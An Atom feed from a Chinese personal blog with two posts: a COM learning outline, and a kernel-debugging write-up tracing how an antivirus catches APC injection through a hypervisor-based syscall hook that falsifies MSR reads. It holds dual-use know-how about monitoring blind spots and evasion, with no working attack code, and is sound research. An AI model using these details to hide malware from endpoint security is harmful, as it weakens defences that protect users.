<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-02-12T18:24:13+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
</subtitle><entry><title type="html">COM学习</title><link href="https://citrusice.github.io/posts/studying-com/" rel="alternate" type="text/html" title="COM学习" /><published>2021-02-12T18:21:48+08:00</published><updated>2021-02-12T18:21:48+08:00</updated><id>https://citrusice.github.io/posts/studying-com</id><content type="html" xml:base="https://citrusice.github.io/posts/studying-com/">&lt;p&gt;com不是什么新的东西，主要是写一下学习路径&lt;/p&gt;

&lt;h2 id=&quot;类&quot;&gt;类&lt;/h2&gt;

&lt;p&gt;回答以下几个问题&lt;/p&gt;

&lt;p&gt;类在内存中的样子？&lt;/p&gt;

&lt;p&gt;类对象在内存中的样子？&lt;/p&gt;

&lt;p&gt;多态底层怎么实现？为什么基类指针指向派生类对象就能实现多态？底层是怎么做的？&lt;/p&gt;

&lt;p&gt;构造函数可以为虚函数吗？如果构造函数为虚函数，能够实现多态吗？为什么？&lt;/p&gt;

&lt;p&gt;析构函数可以为虚函数吗？为什么？&lt;/p&gt;

&lt;p&gt;如果派生类不重写虚函数， 基类指针指向派生类对象，调用的是谁的虚函数？&lt;/p&gt;

&lt;h2 id=&quot;认识com组件&quot;&gt;认识COM组件&lt;/h2&gt;

&lt;p&gt;com有in-proc与out-proc两种形态&lt;/p&gt;

&lt;p&gt;使用c/c++编写inproc com组件&lt;/p&gt;

&lt;p&gt;编写outproc组件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;了解idl、alt&lt;/li&gt;
  &lt;li&gt;使用alt实现out-proc com&lt;/li&gt;
  &lt;li&gt;不使用alt实现out-proc com&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;localserver-com如何通信&quot;&gt;localserver com如何通信&lt;/h2&gt;

&lt;p&gt;基于rpc&lt;/p&gt;

&lt;p&gt;编写RPC helloworld&lt;/p&gt;

&lt;h2 id=&quot;vbs如何获取到类函数地址&quot;&gt;vbs如何获取到类函数地址&lt;/h2&gt;

&lt;p&gt;对于脚本语言来说，他无法获取到目标类函数在虚表中的位置，那么com组件通过什么样的方式来实现”语言无关”呢？&lt;/p&gt;

&lt;p&gt;了解IDispatch&lt;/p&gt;

&lt;p&gt;了解typelib&lt;/p&gt;

&lt;h2 id=&quot;marshaling&quot;&gt;Marshaling&lt;/h2&gt;

&lt;h2 id=&quot;dcom&quot;&gt;DCOM&lt;/h2&gt;

&lt;p&gt;https://saravanesh.files.wordpress.com/2007/09/understanding-com.pdf&lt;/p&gt;

&lt;h2 id=&quot;dll-surrogate&quot;&gt;dll surrogate&lt;/h2&gt;

&lt;p&gt;https://docs.microsoft.com/en-us/windows/win32/com/registering-the-dll-server-for-surrogate-activation&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;ole、activex、winrt、.net，com是这些东西的基础，在了解了com之后再去学习这些微软的技术、框架会变得更加轻松&lt;/p&gt;</content><author><name></name></author><category term="develop" /><summary type="html">com不是什么新的东西，主要是写一下学习路径</summary></entry><entry><title type="html">我们的程序如何被监控</title><link href="https://citrusice.github.io/posts/how-is-our-program-monitored/" rel="alternate" type="text/html" title="我们的程序如何被监控" /><published>2021-01-14T12:29:42+08:00</published><updated>2021-01-14T12:29:42+08:00</updated><id>https://citrusice.github.io/posts/how-is-our-program-monitored</id><content type="html" xml:base="https://citrusice.github.io/posts/how-is-our-program-monitored/">&lt;p&gt;ring3下，杀软对程序无非就是各种iat hook、inline hook；在ring0由于有pg的出现，杀软厂商们不得不放弃原来使用的hook而使用微软提供的内核回调&lt;/p&gt;

&lt;p&gt;我所知道的回调大概有这些&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;进程创建回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程创建回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;模块加载回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注册表回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;文件监控回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;网络监控回调&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些内核回调函数对于程序行为的监控基本是很完全了，但是还不够，是有很多盲点的。聪明的黑客们也早已想到了很多办法，其中apc注入就是一种最为典型的来绕过这些内核回调监控的方法，早已被滥用于许多木马中。&lt;/p&gt;

&lt;p&gt;既然在ring0无法使用回调的方式监控apc注入，有些杀毒软件厂商就将hook位置从内核拿到用户态。ring3下hook的好处是简单、稳定，纵使hook出现了问题也最多是程序崩溃而不会影响全局，而缺点也是显而易见的——容易被绕过、摘除&lt;/p&gt;

&lt;p&gt;那么这是否意味着我们只要绕过了ring3下的hook，apc注入便可以成为一种难以被察觉的进程注入手段呢？答案肯定是否定的，只要对apc注入进行过测试就会知道这种方式是会被拦截的。但是杀软是如何监控到的呢？带着这个问题，我开始了探索，并写这篇文章来简要记录。&lt;/p&gt;

&lt;p&gt;首先写一个简单的apc注入器，在安装了杀软的环境中进行注入&lt;/p&gt;

&lt;p&gt;尽管知道不会是ring3下的hook，但是保险起见，一直跟入到syscall&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201214171817590.png&quot; alt=&quot;image-20201214171817590&quot; /&gt;&lt;/p&gt;

&lt;p&gt;没有hook&lt;/p&gt;

&lt;p&gt;接下来我们要进入内核一探究竟，syscall是进入内核的指令，根据手册，syscall指令会从msr的lstar（0xC0000082）中读取地址作为rip&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; rdmsr c0000082
msr[c0000082] = fffff800`0dc116c0
0: kd&amp;gt; u fffff800`0dc116c0
nt!KiSystemCall64:
fffff800`0dc116c0 0f01f8          swapgs
fffff800`0dc116c3 654889242510000000 mov   qword ptr gs:[10h],rsp
fffff800`0dc116cc 65488b2425a8010000 mov   rsp,qword ptr gs:[1A8h]
fffff800`0dc116d5 6a2b            push    2Bh
fffff800`0dc116d7 65ff342510000000 push    qword ptr gs:[10h]
fffff800`0dc116df 4153            push    r11
fffff800`0dc116e1 6a33            push    33h
fffff800`0dc116e3 51              push    rcx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到其中的地址指向了nt!KiSystemCall64，于是在这里下断，运行，程序并没有被断住。&lt;/p&gt;

&lt;p&gt;到这里就卡住了，我之前从未对这里下过断点，仅仅知道这个函数大概会根据ssdt找到NtQueueApcThread对应的内核函数并调用，我也想不出任何关于调试器无法在这里下断的原因，尽管我可以静态分析来查看杀软是否对这里进行了hook，但此时我更想知道这到底是怎么一回事。&lt;/p&gt;

&lt;p&gt;经过两天的研究事情终于有了一些眉目，在正常的情况下对nt!KiSystemCall64下断点会导致BSOD，而我这里由于杀软做了某些操作导致无事发生。nt!KiSystemCall64的前三条指令设置了gs寄存器以及内核栈，而windbg的调试实际上是依赖于windows内核的，windbg做的只不过是通过串口与内核进行交互，因此在已经进入了ring0但内核栈没有设置正确的情况下触发异常会导致蓝屏。那为什么在安装了杀软的环境中断点没有生效呢？一种情况是可能cpu根本没有运行那些指令，而是绕开了断点走了其他的地方，又或者是杀软可能对一些debug函数进行了hook阻碍了我的调试。&lt;/p&gt;

&lt;p&gt;为了检查杀软确实没有在nt!KiSystemCall64中hook，只能静态看一下了，把这个函数的内存dump下来比较一下&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;diff&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\no-av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SideIndicator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\no-av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;内容是一致的&lt;/p&gt;

&lt;p&gt;从系统调用的入口没办法继续跟进，那就只能从出口入手了。&lt;/p&gt;

&lt;p&gt;首先要检查的是ssdt中的内容是否有被更改，从ntdll!NtQueueApcThread中可以看到，他的调用号是45h&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; u nt!KiServiceTable+(dwo(nt!KiServiceTable+(4*45))&amp;gt;&amp;gt;4)
nt!NtQueueApcThread:
fffff802`36a962a0 4883ec38        sub     rsp,38h
fffff802`36a962a4 488b442460      mov     rax,qword ptr [rsp+60h]
fffff802`36a962a9 4889442428      mov     qword ptr [rsp+28h],rax
fffff802`36a962ae 4c894c2420      mov     qword ptr [rsp+20h],r9
fffff802`36a962b3 4d8bc8          mov     r9,r8
fffff802`36a962b6 4c8bc2          mov     r8,rdx
fffff802`36a962b9 33d2            xor     edx,edx
fffff802`36a962bb e810000000      call    nt!NtQueueApcThreadEx (fffff802`36a962d0)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ssdt表是正常的，没有被修改&lt;/p&gt;

&lt;p&gt;在nt!NtQueueApcThread下断，让程序跑起来，等待程序断下后查看调用堆栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; 
Breakpoint 2 hit
nt!NtQueueApcThread:
0010:fffff802`36a962a0 4883ec38        sub     rsp,38h
0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 fffffd05`75cf2918 fffff802`3a2b34db     nt!NtQueueApcThread
01 fffffd05`75cf2920 ffffe60e`35f67080     0xfffff802`3a2b34db 奇怪的调用者
02 fffffd05`75cf2928 00000000`00000016     0xffffe60e`35f67080
03 fffffd05`75cf2930 fffffd05`75cf2950     0x16
04 fffffd05`75cf2938 00000202`6fdb0000     0xfffffd05`75cf2950
05 fffffd05`75cf2940 00000000`00000000     0x00000202`6fdb0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;与正常的调用作比较&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffff920b`14837a88 fffff800`0dc11bb5     nt!NtQueueApcThread
01 ffff920b`14837a90 00007ffe`27fac644     nt!KiSystemServiceCopyEnd+0x25
02 000000e6`96cff598 00007ffe`258a137f     ntdll!NtQueueApcThread+0x14
03 000000e6`96cff5a0 00007ff6`5f1d95d8     KERNELBASE!QueueUserAPC+0x8f
04 000000e6`96cff600 00000000`00000000     xxxx!inject+0x4d8 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到杀软对我们的hook&lt;/p&gt;

&lt;p&gt;分析这个hook函数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0010:fffff802`3a2b3428 4c8bdc           mov     r11, rsp ;函数起始位置，栈指针存入r11
0010:fffff802`3a2b342b 49895b08         mov     qword ptr [r11+8], rbx ; 存rbx
0010:fffff802`3a2b342f 49897310         mov     qword ptr [r11+10h], rsi; 存rsi
0010:fffff802`3a2b3433 57               push    rdi
0010:fffff802`3a2b3434 4881ec60010000   sub     rsp, 160h
0010:fffff802`3a2b343b 488b842490010000 mov     rax, qword ptr [rsp+190h]
0010:fffff802`3a2b3443 48894c2430       mov     qword ptr [rsp+30h], rcx
0010:fffff802`3a2b3448 0fb70dbd540600   movzx   ecx, word ptr [fffff802`3a31890c]
0010:fffff802`3a2b344f 4889442450       mov     qword ptr [rsp+50h], rax
0010:fffff802`3a2b3454 498d4328         lea     rax, [r11+28h]
0010:fffff802`3a2b3458 4c89442440       mov     qword ptr [rsp+40h], r8
0010:fffff802`3a2b345d 4889442428       mov     qword ptr [rsp+28h], rax
0010:fffff802`3a2b3462 4c894c2448       mov     qword ptr [rsp+48h], r9
0010:fffff802`3a2b3467 488d442460       lea     rax, [rsp+60h]
0010:fffff802`3a2b346c 4889542438       mov     qword ptr [rsp+38h], rdx
0010:fffff802`3a2b3471 4d8d8b78ffffff   lea     r9, [r11-88h]
0010:fffff802`3a2b3478 4c8d442430       lea     r8, [rsp+30h]
0010:fffff802`3a2b347d ba16000000       mov     edx, 16h
0010:fffff802`3a2b3482 4889442420       mov     qword ptr [rsp+20h], rax
0010:fffff802`3a2b3487 e87852ffff       call    fffff802`3a2a8704
0010:fffff802`3a2b348c 8bd8             mov     ebx, eax
0010:fffff802`3a2b348e 3d030500c0       cmp     eax, 0C0000503h
0010:fffff802`3a2b3493 7504             jne     fffff802`3a2b3499
0010:fffff802`3a2b3495 33db             xor     ebx, ebx
0010:fffff802`3a2b3497 eb45             jmp     fffff802`3a2b34de
0010:fffff802`3a2b3499 85c0             test    eax, eax
0010:fffff802`3a2b349b 7841             js      fffff802`3a2b34de
0010:fffff802`3a2b349d 488b157c550600   mov     rdx, qword ptr [fffff802`3a318a20] ;rdx指向nt!KeServiceDescriptorTable
0010:fffff802`3a2b34a4 0fb70d61540600   movzx   ecx, word ptr [fffff802`3a31890c] ;调用号
0010:fffff802`3a2b34ab 4c8b4c2448       mov     r9, qword ptr [rsp+48h]
0010:fffff802`3a2b34b0 488b02           mov     rax, qword ptr [rdx] ;rax指向了ssdt
0010:fffff802`3a2b34b3 4c8b442440       mov     r8, qword ptr [rsp+40h]
0010:fffff802`3a2b34b8 488b542438       mov     rdx, qword ptr [rsp+38h]
0010:fffff802`3a2b34bd 8b0c88           mov     ecx, dword ptr [rax+rcx*4];根据调用号与ssdt基地址获取了内核函数的偏移
0010:fffff802`3a2b34c0 c1f904           sar     ecx, 4 ;右移4位
0010:fffff802`3a2b34c3 4c63d1           movsxd  r10, ecx
0010:fffff802`3a2b34c6 488b4c2430       mov     rcx, qword ptr [rsp+30h]
0010:fffff802`3a2b34cb 4c03d0           add     r10, rax ;计算出目标函数地址
0010:fffff802`3a2b34ce 488b442450       mov     rax, qword ptr [rsp+50h]
0010:fffff802`3a2b34d3 4889442420       mov     qword ptr [rsp+20h], rax
0010:fffff802`3a2b34d8 41ffd2           call    r10 ;调用目标函数
0010:fffff802`3a2b34db 488bd8           mov     rbx, rax
0010:fffff802`3a2b34de 4863bc2490010000 movsxd  rdi, dword ptr [rsp+190h]
0010:fffff802`3a2b34e6 85ff             test    edi, edi
0010:fffff802`3a2b34e8 743a             je      fffff802`3a2b3524
0010:fffff802`3a2b34ea 488d34fdf8ffffff lea     rsi, [rdi*8-8]
0010:fffff802`3a2b34f2 4c8b4c3460       mov     r9, qword ptr [rsp+rsi+60h]
0010:fffff802`3a2b34f7 488d542430       lea     rdx, [rsp+30h]
0010:fffff802`3a2b34fc 4c63c3           movsxd  r8, ebx
0010:fffff802`3a2b34ff b916000000       mov     ecx, 16h
0010:fffff802`3a2b3504 ff9434e0000000   call    qword ptr [rsp+rsi+0E0h]
0010:fffff802`3a2b350b 3d030500c0       cmp     eax, 0C0000503h
0010:fffff802`3a2b3510 7504             jne     fffff802`3a2b3516
0010:fffff802`3a2b3512 33db             xor     ebx, ebx
0010:fffff802`3a2b3514 eb05             jmp     fffff802`3a2b351b
0010:fffff802`3a2b3516 85c0             test    eax, eax
0010:fffff802`3a2b3518 0f48d8           cmovs   ebx, eax
0010:fffff802`3a2b351b 4883ee08         sub     rsi, 8
0010:fffff802`3a2b351f 83c7ff           add     edi, 0FFFFFFFFh
0010:fffff802`3a2b3522 75ce             jne     fffff802`3a2b34f2
0010:fffff802`3a2b3524 4c8d9c2460010000 lea     r11, [rsp+160h]; 清栈   
0010:fffff802`3a2b352c 8bc3             mov     eax, ebx
0010:fffff802`3a2b352e 498b5b10         mov     rbx, qword ptr [r11+10h]
0010:fffff802`3a2b3532 498b7318         mov     rsi, qword ptr [r11+18h]
0010:fffff802`3a2b3536 498be3           mov     rsp, r11
0010:fffff802`3a2b3539 5f               pop     rdi ;rsp现在指向 nt!KiSystemServiceCopyEnd + 0x25 
0010:fffff802`3a2b353a c3               ret     
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出它同样实现了KiSystemCall64的功能做了查找ssdt的工作&lt;/p&gt;

&lt;p&gt;这段函数不属于任意一个模块，而根据最后函数最后ret的地址指向 nt!KiSystemServiceCopyEnd + 0x25，这似乎意味着这个hook函数是正常从nt!KiSystemServiceCopyEnd调用过来的。但是正常情况来讲nt!KiSystemServiceCopyEnd会从原有的ssdt中取值计算出用户态syscall对应的内核函数，如果这个hook函数是由KiSystemServiceCopyEnd调用的，这也就代表杀软修改了ssdt，这就出现了矛盾。因此我猜测这个返回地址是伪造出来的，可以用这样几种方式实现&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;push nt!KiSystemServiceCopyEnd + 0x25
jmp hook_func_addr_offset

push nt!KiSystemServiceCopyEnd + 0x25
mov rax,hook_func_addr
jmp rax

push nt!KiSystemServiceCopyEnd + 0x25
push hook_func_addr_offset
ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用这样的代码来调用它，我们可以伪造出调用方，防止逆向人员的逆向&lt;/p&gt;

&lt;p&gt;尝试在nt!KiSystemServiceCopyEnd设置断点，很幸运，与在KiSystemCall64设置断点不同，在这里断点可以生效。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceCopyEnd
nt!KiSystemServiceCopyEnd:
fffff802`3681eb90 f705665a8f0001000000 test dword ptr [nt!KiDynamicTraceMask (fffff802`37114600)],1
fffff802`3681eb9a 0f8593040000    jne     nt!KiSystemServiceExitPico+0x1fe (fffff802`3681f033)
fffff802`3681eba0 f705de588f0040000000 test dword ptr [nt!PerfGlobalGroupMask+0x8 (fffff802`37114488)],40h
fffff802`3681ebaa 0f85f7040000    jne     nt!KiSystemServiceExitPico+0x272 (fffff802`3681f0a7)
fffff802`3681ebb0 498bc2          mov     rax,r10
fffff802`3681ebb3 ffd0            call    rax
fffff802`3681ebb5 0f1f00          nop     dword ptr [rax]
fffff802`3681ebb8 65ff0425b82e0000 inc     dword ptr gs:[2EB8h]
1: kd&amp;gt; r r10
r10=fffff8023a2b3428
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后的代码会调用r10中指向的函数，而r10的地址正是之前分析的hook函数的地址，看来hook函数的调用这就是nt!KiSystemServiceCopyEnd + 0x25，而并非是伪造出的。&lt;/p&gt;

&lt;p&gt;那么这个r10中的地址是怎样得到的呢，从nt!KiSystemServiceCopyEnd往上翻，我们可以找到r10的来源&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceRepeat  nt!KiSystemServiceGdiTebAccess
nt!KiSystemServiceRepeat:
fffff802`3681ea34 4c8d1585ae9f00  lea     r10,[nt!KeServiceDescriptorTable (fffff802`372198c0)]
fffff802`3681ea3b 4c8d1dfe5f8f00  lea     r11,[nt!KeServiceDescriptorTableShadow (fffff802`37114a40)]
fffff802`3681ea42 f7437880000000  test    dword ptr [rbx+78h],80h
fffff802`3681ea49 7413            je      nt!KiSystemServiceRepeat+0x2a (fffff802`3681ea5e)
fffff802`3681ea4b f7437800002000  test    dword ptr [rbx+78h],200000h
fffff802`3681ea52 7407            je      nt!KiSystemServiceRepeat+0x27 (fffff802`3681ea5b)
fffff802`3681ea54 4c8d1d65618f00  lea     r11,[nt!KeServiceDescriptorTableFilter (fffff802`37114bc0)]
fffff802`3681ea5b 4d8bd3          mov     r10,r11
fffff802`3681ea5e 413b443a10      cmp     eax,dword ptr [r10+rdi+10h]
fffff802`3681ea63 0f832c050000    jae     nt!KiSystemServiceExitPico+0x160 (fffff802`3681ef95)
fffff802`3681ea69 4d8b143a        mov     r10,qword ptr [r10+rdi]
fffff802`3681ea6d 4d631c82        movsxd  r11,dword ptr [r10+rax*4]
fffff802`3681ea71 498bc3          mov     rax,r11
fffff802`3681ea74 49c1fb04        sar     r11,4
fffff802`3681ea78 4d03d3          add     r10,r11
fffff802`3681ea7b 83ff20          cmp     edi,20h
fffff802`3681ea7e 7550            jne     nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0)
fffff802`3681ea80 4c8b9bf0000000  mov     r11,qword ptr [rbx+0F0h]
nt!KiSystemServiceGdiTebAccess:
fffff802`3681ea87 4183bb4017000000 cmp     dword ptr [r11+1740h],0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从代码中可以看出，r10应该是解析了ssdt表后所指向的内核函数，而从我们调试得到的结果来看，r10指向的并非是应该指向的函数，并且ssdt表也没有被修改。&lt;/p&gt;

&lt;p&gt;继续在nt!KiSystemServiceRepeat这里下断点，发现情况与之前在KiSystemCall64下断的情况一下，断点并未生效。&lt;/p&gt;

&lt;p&gt;经过一番摸索后发现，在nt!KiSystemServiceRepeat+0x47之后的地方下断都可以生效，而在其之前都无法生效&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceRepeat+0x47
nt!KiSystemServiceRepeat+0x47:
fffff802`3681ea7b 83ff20          cmp     edi,20h
fffff802`3681ea7e 7550            jne     nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0)
fffff802`3681ea80 4c8b9bf0000000  mov     r11,qword ptr [rbx+0F0h]
.....
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;断在这里的时候r10已经指向hook函数&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; g
Breakpoint 6 hit
nt!KiSystemServiceRepeat+0x47:
0010:fffff802`3681ea7b 83ff20          cmp     edi,20h
1: kd&amp;gt; r r10
r10=fffff8023a2b3428
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;确实有点不知道如何是好了，看起来在执行syscall之后，cpu并没有来到nt!KiSystemCall64，而是走了另外的代码，最终又跳转回来。&lt;/p&gt;

&lt;p&gt;有想过把附近4gb的内存全部dump下来用ida分析看看是哪里跳过来的，但是仔细一想根本不可行，4gb内存不知道要分析多长时间，而且这4gb内存必然是不连续的，在dump过程中会访问到不可读的内存导致出错。&lt;/p&gt;

&lt;p&gt;又折腾了两三天，在查阅资料的过程中我了解到了这是一种基于vmm的hook，他修改了msr中的值，让cpu在执行syscall时跳转到它的hook函数，而当其他人读取msr寄存器中的值时会返回一个伪造的值让msr看起来并没有被修改。但是如何证明杀软确实是这么做的呢？qemu理论应该可以跟踪cpu的执行流程在执行syscall后跳到了hook函数的地址，或者直接获取msr寄存器中真实的值（纯软件模拟应该可以，但是现在qemu并非纯软件模拟了）。最后感觉自己这方面知识太少还不足以去调试vt，只好弄了个最简单的方法：在关掉了虚拟化后，在KiSystemCall64下断可以生效。这大概也算是证明了吧。&lt;/p&gt;

&lt;p&gt;基于vmm，不但可以修改msr不被发现，甚至连内存也可以伪造出来，有点想到黑客帝国了。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;本来文章到这里应该就结束了，但是一周之后再回头看一眼，尽管已经回答了文章开头提出的问题，但是有点虎头蛇尾，所以准备进一步研究一下。&lt;/p&gt;

&lt;p&gt;这次准备找一下杀软处理vm的模块以及相关函数，尽量看一看内部逻辑。&lt;/p&gt;

&lt;p&gt;找之前先翻了一些文档以及基于vt的hook框架，大概对vt有了一些了解。由于模块名字比较显眼，一下就看到了对应的模块。根据之前的了解，启动虚拟机需要使用VMXON指令，因此直接搜这个指令一下就可以定位到启用vmx的代码开始逆向&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174052058.png&quot; alt=&quot;image-20210113174052058&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174325354.png&quot; alt=&quot;image-20210113174325354&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174519268.png&quot; alt=&quot;image-20210113174519268&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这段代码为启用vmx做了一些检查，然后为每个cpu分配4KB的物理空间用于记录一些信息（vmxon需要），最后调用vmxon进行启用虚拟机，随后调用vmInit进行初始化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175449339.png&quot; alt=&quot;image-20210113175449339&quot; /&gt;&lt;/p&gt;

&lt;p&gt;vmInit函数很大，一番搜寻后我找到了设置vm host入口的代码，即处理vm事件的函数VM_handler。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175520122.png&quot; alt=&quot;image-20210113175520122&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VM_hanlder在保存现场之后，调用GetVMExitReason&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175706367.png&quot; alt=&quot;image-20210113175706367&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113180222755.png&quot; alt=&quot;image-20210113180222755&quot; /&gt;&lt;/p&gt;

&lt;p&gt;函数通过vmread读取VM_EXIT_REASON，并根据不同的值调用不同的函数。当cpu使用rdmsr指令时会触发vm_exit事件，其对应的VM_EXIT_REASON为31。当VM_handler捕获到rdmsr指令时会调用SpoofMSRFunc来欺骗调用者，返回假的msr值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113180700346.png&quot; alt=&quot;image-20210113180700346&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看出来当读取msr的index为if中的那些值时这个函数会对其进行处理。&lt;/p&gt;

